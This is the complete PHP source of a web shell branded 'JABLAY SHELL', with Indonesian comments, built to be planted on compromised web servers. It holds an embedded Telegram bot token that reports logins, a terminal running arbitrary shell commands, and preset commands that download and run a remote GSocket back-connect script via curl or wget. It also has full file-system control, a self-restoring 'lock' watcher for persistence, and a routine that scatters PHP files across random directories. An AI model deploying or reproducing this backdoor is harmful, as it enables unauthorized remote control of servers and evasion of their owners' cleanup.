<?php
session_start();

// KONFIG
$hashed_password = '$2y$10$cTt0RgRoshMIhn2Z8hOCduGyI/uV2lYv6YEYf0RSqFN5IPwEm5Dve'; // bcrypt
$botToken = '7940404768:AAGNTcNtiFbc5H_ZfkPLm-g1Sy2ywsjDbSo';
$chatId = '-4794875087';

// UTIL
function sendTelegram($text) {
    global $botToken, $chatId;
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $msg = urlencode("[Login Backdoor]\nIP: $ip\n$text");
    @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
}
function rand_str($len = 8) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $len);
}

// LOGIN
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
        $_SESSION['login'] = true;
        sendTelegram("Login berhasil!");
        header("Location: ?"); exit;
    }
    echo '<!DOCTYPE html><html>
<head>
  <meta charset="UTF-8">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
    }

    .slider-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      width: 200vw; /* 2x layar untuk animasi */
      height: 100vh;
      display: flex;
      flex-wrap: wrap;
      z-index: -2;
      animation: slide 20s linear infinite;
    }

    .slider-wrapper img {
      width: 33.33vw;
      height: 50vh;
      object-fit: cover;
    }

    @keyframes slide {
      0%   { transform: translateX(0); }
      100% { transform: translateX(-100vw); }
    }

    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.4);
      z-index: -1;
    }
  </style>
</head>
<body class="flex items-center justify-center text-white">

  <!-- SLIDER BACKGROUND -->
  <div class="slider-wrapper">
  <!-- 26 Gambar pertama -->
  <img src="https://i.postimg.cc/7LHk5NMF/figure.jpg">
  <img src="https://i.postimg.cc/GmJR3fYP/03c6ca84-685f-408e-9239-13593ba8b56e.jpg">
  <img src="https://i.postimg.cc/fb8hm08J/46ff965d-30fa-4807-aafa-644d41dda548.jpg">
  <img src="https://i.postimg.cc/vBDwzHKX/ad2dcb59-36ff-480e-bd8a-47ee428da02d.jpg">
  <img src="https://i.postimg.cc/02SxFjyB/cewe1.jpg">
  <img src="https://i.postimg.cc/vZdMsy1H/fa2c332e-41d7-4deb-a570-ed0aaca928ee.jpg">
  <img src="https://i.postimg.cc/Pq0CsxwV/image.jpg">
  <img src="https://i.postimg.cc/J050k5dS/00a8c7b5-09fb-4181-bb9e-ac0688bcc9f2.jpg">
  <img src="https://i.postimg.cc/HL8L2ghw/1ed8deb7-8931-4161-b591-57a5e6726ec6.jpg">
  <img src="https://i.postimg.cc/fTvStDGk/3a92ab2a-5ffe-40fe-a1f5-c50b1c3549aa.jpg">
  <img src="https://i.postimg.cc/TPKK4mpW/4a268cc6-3590-4f43-8b76-9defa9797c8c.jpg">
  <img src="https://i.postimg.cc/kgp4K4fM/52fc16f0-50bf-408f-99cb-503dd65934f1.jpg">
  <img src="https://i.postimg.cc/vZBT497S/552c7417-c95e-4a5c-9119-d631bf82c2f1.jpg">
  <img src="https://i.postimg.cc/y8QJjnYH/6dd6a965-c0bd-430e-b504-56c88c38ff8f.jpg">
  <img src="https://i.postimg.cc/fTs0RJg6/6e32bf3a-f23b-45dc-bba7-f43f9e7fc7b5.jpg">
  <img src="https://i.postimg.cc/tT04vMKL/7a6c6819-ce6a-44c3-ba27-993359367f31.jpg">
  <img src="https://i.postimg.cc/RFfNMB1S/8096519f-5fcc-4829-84ff-98618b6ceba7.jpg">
  <img src="https://i.postimg.cc/CMGzXwLJ/899e6e12-39ea-4d45-97a6-00660595b433.jpg">
  <img src="https://i.postimg.cc/tC9YH8sb/ae901fa6-bf15-4ab2-ba20-820df63df460.jpg">
  <img src="https://i.postimg.cc/jSdwyBTc/b5ec3f0e-15fb-4323-b32b-064767b3e12f.jpg">
  <img src="https://i.postimg.cc/3RgJsZ7W/cef752ae-6665-438d-b9b4-ddc35436b2e6.jpg">
  <img src="https://i.postimg.cc/QC3VCySp/dc9c7c5d-1e2a-47e9-9e10-b901cd84d1b8.jpg">
  <img src="https://i.postimg.cc/9XZ72G1d/dd0bd714-447d-4d08-ab02-00e3d64e190a.jpg">
  <img src="https://i.postimg.cc/SR62GhjT/download.jpg">
  <img src="https://i.postimg.cc/SRFY8sQY/download-1.jpg">
  <img src="https://i.postimg.cc/bNLdYLnt/010-2600-4111-hehe-777.jpg">

  <!-- 26 Gambar ulang untuk animasi halus -->
  <img src="https://i.postimg.cc/7LHk5NMF/figure.jpg">
  <img src="https://i.postimg.cc/GmJR3fYP/03c6ca84-685f-408e-9239-13593ba8b56e.jpg">
  <img src="https://i.postimg.cc/fb8hm08J/46ff965d-30fa-4807-aafa-644d41dda548.jpg">
  <img src="https://i.postimg.cc/vBDwzHKX/ad2dcb59-36ff-480e-bd8a-47ee428da02d.jpg">
  <img src="https://i.postimg.cc/02SxFjyB/cewe1.jpg">
  <img src="https://i.postimg.cc/vZdMsy1H/fa2c332e-41d7-4deb-a570-ed0aaca928ee.jpg">
  <img src="https://i.postimg.cc/Pq0CsxwV/image.jpg">
  <img src="https://i.postimg.cc/J050k5dS/00a8c7b5-09fb-4181-bb9e-ac0688bcc9f2.jpg">
  <img src="https://i.postimg.cc/HL8L2ghw/1ed8deb7-8931-4161-b591-57a5e6726ec6.jpg">
  <img src="https://i.postimg.cc/fTvStDGk/3a92ab2a-5ffe-40fe-a1f5-c50b1c3549aa.jpg">
  <img src="https://i.postimg.cc/TPKK4mpW/4a268cc6-3590-4f43-8b76-9defa9797c8c.jpg">
  <img src="https://i.postimg.cc/kgp4K4fM/52fc16f0-50bf-408f-99cb-503dd65934f1.jpg">
  <img src="https://i.postimg.cc/vZBT497S/552c7417-c95e-4a5c-9119-d631bf82c2f1.jpg">
  <img src="https://i.postimg.cc/y8QJjnYH/6dd6a965-c0bd-430e-b504-56c88c38ff8f.jpg">
  <img src="https://i.postimg.cc/fTs0RJg6/6e32bf3a-f23b-45dc-bba7-f43f9e7fc7b5.jpg">
  <img src="https://i.postimg.cc/tT04vMKL/7a6c6819-ce6a-44c3-ba27-993359367f31.jpg">
  <img src="https://i.postimg.cc/RFfNMB1S/8096519f-5fcc-4829-84ff-98618b6ceba7.jpg">
  <img src="https://i.postimg.cc/CMGzXwLJ/899e6e12-39ea-4d45-97a6-00660595b433.jpg">
  <img src="https://i.postimg.cc/tC9YH8sb/ae901fa6-bf15-4ab2-ba20-820df63df460.jpg">
  <img src="https://i.postimg.cc/jSdwyBTc/b5ec3f0e-15fb-4323-b32b-064767b3e12f.jpg">
  <img src="https://i.postimg.cc/3RgJsZ7W/cef752ae-6665-438d-b9b4-ddc35436b2e6.jpg">
  <img src="https://i.postimg.cc/QC3VCySp/dc9c7c5d-1e2a-47e9-9e10-b901cd84d1b8.jpg">
  <img src="https://i.postimg.cc/9XZ72G1d/dd0bd714-447d-4d08-ab02-00e3d64e190a.jpg">
  <img src="https://i.postimg.cc/SR62GhjT/download.jpg">
  <img src="https://i.postimg.cc/SRFY8sQY/download-1.jpg">
  <img src="https://i.postimg.cc/bNLdYLnt/010-2600-4111-hehe-777.jpg">
</div>

  <!-- Overlay gelap -->
  <div class="overlay"></div>

  <!-- LOGIN FORM -->
  <div class="bg-black/70 p-8 rounded shadow-md text-center w-full max-w-md z-10 backdrop-blur-sm">
    <h2 class="text-3xl font-bold text-red-400 mb-6">౨ৎ JABLAY SHELL ౨ৎ</h2>
	<h2 class="text-1xl font-bold text-blue-400 mb-3">By VINSxHYDRA</h2>
    <form method="POST">
      <input type="password" name="pass" class="w-full p-2 mb-4 rounded bg-gray-700 text-white text-center" placeholder="Password" required>
      <button type="submit" class="bg-green-600 hover:bg-green-700 transition px-4 py-2 rounded w-full">Login</button>
    </form>
  </div>

</body>
</html>

'; exit;
}

// PATH
$dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();
$dirReal = realpath($dir);

// HANDLER
if (isset($_POST['cmd'])) $terminalOutput = shell_exec($_POST['cmd']);
if (isset($_POST['gs_command'])) {
    $gsOutput = shell_exec($_POST['gs_command']);
    @unlink("defunct");
    @unlink("defunct.dat");
}
if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $dirReal.'/'.$_FILES['upload']['name']);
if (isset($_POST['newfile'])) file_put_contents($dirReal.'/'.$_POST['newfile'], '');
if (isset($_POST['newfolder'])) mkdir($dirReal.'/'.$_POST['newfolder']);
if (isset($_POST['savefile'], $_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['savefile']);
    header("Location: ?path=" . urlencode(dirname($_POST['filename']))); exit;
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $f = $_GET['edit'];
    $c = htmlspecialchars(file_get_contents($f));
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><script src='https://cdn.tailwindcss.com'></script></head>
    <body class='bg-gray-900 text-white p-10'><div class='max-w-5xl mx-auto'>
    <h2 class='text-4xl mb-6'>Editing: <span class='text-green-400'>" . basename($f) . "</span></h2>
    <form method='POST'><textarea name='savefile' rows='25' class='w-full bg-black text-green-400 p-4 rounded border border-green-600'>$c</textarea>
    <input type='hidden' name='filename' value='$f'>
    <div class='mt-6 flex space-x-4'>
    <button type='submit' class='bg-green-600 px-6 py-3 rounded'>💾 Save</button>
    <a href='?path=" . urlencode(dirname($f)) . "' class='text-red-400 text-xl hover:underline'>Cancel</a>
    </div></form></div></body></html>"; exit;
}
if (isset($_GET['del']) && file_exists($_GET['del'])) {
    $t = $_GET['del'];
    is_dir($t) ? rmdir($t) : unlink($t);
    header("Location: ?path=" . urlencode(dirname($t))); exit;
}
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
    header("Location: ?path=" . urlencode(dirname($_POST['rename_from']))); exit;
}
if (isset($_POST['target'], $_POST['perm'])) {
    chmod($_POST['target'], octdec($_POST['perm']));
    header("Location: ?path=" . urlencode(dirname($_POST['target']))); exit;
}
if (isset($_GET['lock']) && is_file($_GET['lock'])) {
    $f = realpath($_GET['lock']);
    $hash = md5($f);
    $cache = "/dev/shm/.cache";
    @mkdir($cache, 0777, true);
    $backup = "$cache/$hash.php";
    copy($f, $backup);
    chmod($f, 0444);

    // PHP watcher
    $cmd = PHP_BINARY . " -r 'while(1){if(!file_exists(\"$f\")){copy(\"$backup\",\"$f\");chmod(\"$f\",0444);}sleep(2);}' > /dev/null 2>&1 &";
    system($cmd);
    header("Location: ?path=" . urlencode(dirname($f))); exit;
}
if (isset($_GET['unlock']) && is_file($_GET['unlock'])) {
    chmod($_GET['unlock'], 0644);
    header("Location: ?path=" . urlencode(dirname($_GET['unlock']))); exit;
}
if (isset($_POST['tebar']) && isset($_POST['tebar_start']) && is_dir($_POST['tebar_start'])) {
    $base = realpath($_POST['tebar_start']);
    $src = '<?php echo "Shell Tebar!"; ?>';
    @mkdir("/tmp/.cache", 0777, true);
    $srcFile = "/tmp/.cache/" . rand_str(10) . ".txt";
    file_put_contents($srcFile, $src);

    $result = "<h3 class='text-green-400 text-xl mb-4'>Shell Tersebar ke:</h3><ul class='list-disc ml-6'>";
    for ($i = 0; $i < 5; $i++) {
        $path = $base;
        for ($d = 0; $d < 3; $d++) {
            $path .= '/' . rand_str(5);
            @mkdir($path, 0777, true);
        }
        $file = $path . '/' . rand_str(5) . '.php';
        copy($srcFile, $file);
        $result .= "<li class='text-blue-400'>$file</li>";
    }
    $result .= "</ul>";
    $_SESSION['tebar_result'] = $result;
    header("Location: ?path=" . urlencode($dirReal)); exit;
}

// INFO
$uname = php_uname();
$user = get_current_user();
$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$phpVer = phpversion();
$disk = disk_total_space($dirReal);
$free = disk_free_space($dirReal);
$used = $disk - $free;
$percent = round(($used / $disk) * 100);
$open_basedir = ini_get('open_basedir') ?: 'NONE';
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white font-mono p-10"><div class="max-w-7xl mx-auto">
<h1 class="text-5xl mb-6 text-center text-red-400 font-bold">౨ৎ JABLAY SHELL ౨ৎ</h1>
<div class="mb-4 text-sm">
<div><span class="text-green-400 font-bold">Uname:</span> <?= $uname ?></div>
<div><span class="text-pink-400 font-bold">User:</span> <?= $user ?></div>
<div><span class="text-red-400 font-bold">ServerIP:</span> <?= $serverIP ?> <span class="ml-4">Your IP: <?= $clientIP ?></span></div>
<div><span class="text-purple-400 font-bold">PHP:</span> <?= $phpVer ?></div>
<div><span class="text-yellow-400 font-bold">Disk:</span> <?= round($disk / 1e+9, 2) ?> GB, <span class="text-green-300">Free: <?= round($free / 1e+9, 2) ?> GB (<?= 100 - $percent ?>%)</span></div>
<div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= $open_basedir ?></div>
</div>
<div class="text-right mb-6"><a href="?logout=true" class="text-red-400">Logout</a></div>

<form method="POST" class="mb-10">
<label class="block mb-2 text-xl">Terminal</label>
<input type="text" name="cmd" class="w-full p-2 text-black rounded" placeholder="whoami">
<button type="submit" class="mt-2 bg-green-600 px-4 py-2 rounded">Execute</button>
<?php if (!empty($terminalOutput)) echo "<pre class='bg-black text-green-400 mt-2 p-2 rounded'>$terminalOutput</pre>"; ?>
</form>

<form method="post" class="mb-10">
<label class="block mb-2">GSocket BackConnect</label>
<select name="gs_command" class="w-full text-black p-2 rounded">
<option value='bash -c "$(curl -fsSL https://gsocket.io/y)"'>curl</option>
<option value='GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"'>curl (no cert check)</option>
<option value='bash -c "$(wget -qO- https://gsocket.io/y)"'>wget</option>
<option value='GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"'>undo</option>
</select>
<button type="submit" class="mt-2 bg-red-600 px-4 py-2 rounded">Run GS</button>
<?php if (!empty($gsOutput)) echo "<pre class='bg-black text-red-400 mt-2 p-2 rounded'>$gsOutput</pre>"; ?>
</form>

<div class="grid grid-cols-3 gap-4 mb-10">
<form method="POST" enctype="multipart/form-data">
<input type="file" name="upload" class="w-full text-black p-2 rounded">
<button type="submit" class="mt-2 bg-blue-600 w-full py-2 rounded">Upload</button>
</form>
<form method="POST">
<input type="text" name="newfile" class="w-full text-black p-2 rounded" placeholder="newfile.php">
<button type="submit" class="mt-2 bg-purple-600 w-full py-2 rounded">Make File</button>
</form>
<form method="POST">
<input type="text" name="newfolder" class="w-full text-black p-2 rounded" placeholder="new_folder">
<button type="submit" class="mt-2 bg-pink-600 w-full py-2 rounded">Make Dir</button>
</form>
</div>

<form method="POST" class="mb-4">
<label class="block mb-2">Tebar Mulai Dari:</label>
<input type="text" name="tebar_start" class="w-full text-black p-2 rounded" placeholder="/var/www/html">
<button type="submit" name="tebar" value="1" class="mt-2 bg-orange-600 w-full py-2 rounded">Tebar Massal</button>
</form>

<?php if (!empty($_SESSION['tebar_result'])) {
    echo "<div class='bg-gray-800 p-4 rounded mb-6'>" . $_SESSION['tebar_result'] . "</div>";
    unset($_SESSION['tebar_result']);
} ?>

<div class="text-sm mb-4">Path:
<?php
$paths = explode(DIRECTORY_SEPARATOR, $dirReal);
$build = '';
foreach ($paths as $p) {
    if ($p === '') continue;
    $build .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?path=" . urlencode($build) . "' class='text-blue-400 hover:underline'>/$p</a> ";
}
?>
</div>

<table class="w-full table-auto border border-gray-700">
<thead><tr class="bg-gray-800"><th class="p-2">Name</th><th class="p-2">Size</th><th class="p-2">Action</th></tr></thead>
<tbody>
<?php
$files = is_readable($dirReal) ? array_diff(scandir($dirReal), ['.', '..']) : [];
$dirs = []; $normalFiles = [];
foreach ($files as $f) {
    $full = $dirReal . DIRECTORY_SEPARATOR . $f;
    if (is_dir($full)) $dirs[] = $f;
    else $normalFiles[] = $f;
}
$orderedFiles = array_merge($dirs, $normalFiles);
foreach ($orderedFiles as $f) {
    $full = $dirReal . DIRECTORY_SEPARATOR . $f;
    $isDir = is_dir($full);
    $size = $isDir ? 'DIR' : filesize($full) . ' B';
    $nameDisplay = $isDir ? "<a href='?path=" . urlencode($full) . "' class='text-yellow-400 hover:underline'>" . htmlspecialchars($f) . "</a>" : htmlspecialchars($f);
    $actions = [];
    if (!$isDir) {
        $actions[] = "<a href='?edit=" . urlencode($full) . "' class='text-green-400'>[Edit]</a>";
        $actions[] = "<a href='?download=" . urlencode($full) . "' class='text-blue-400'>[Download]</a>";
    }
    $actions[] = "<form method='POST' class='inline'><input type='hidden' name='rename_from' value='".htmlspecialchars($full)."'><input name='rename_to' value='".htmlspecialchars($f)."' class='text-black p-1 rounded'><button class='text-purple-400 ml-1' type='submit'>[Rename]</button></form>";
    $actions[] = "<a href='?del=" . urlencode($full) . "' class='text-red-400'>[Delete]</a>";
    $actions[] = "<form method='POST' class='inline'><input type='hidden' name='target' value='".htmlspecialchars($full)."'><input name='perm' value='".substr(sprintf('%o', fileperms($full)), -4)."' class='text-black p-1 rounded w-16'><button class='text-yellow-400 ml-1' type='submit'>[Chmod]</button></form>";
    $actions[] = "<a href='?lock=" . urlencode($full) . "' class='text-gray-400'>[Lock]</a>";
    $actions[] = "<a href='?unlock=" . urlencode($full) . "' class='text-white'>[Unlock]</a>";
    echo "<tr class='border-t border-gray-700'><td class='p-2'>$nameDisplay</td><td class='p-2 text-center'>$size</td><td class='p-2 space-x-2'>" . implode(' ', $actions) . "</td></tr>";
}
?>
</tbody></table>
</div></body></html>
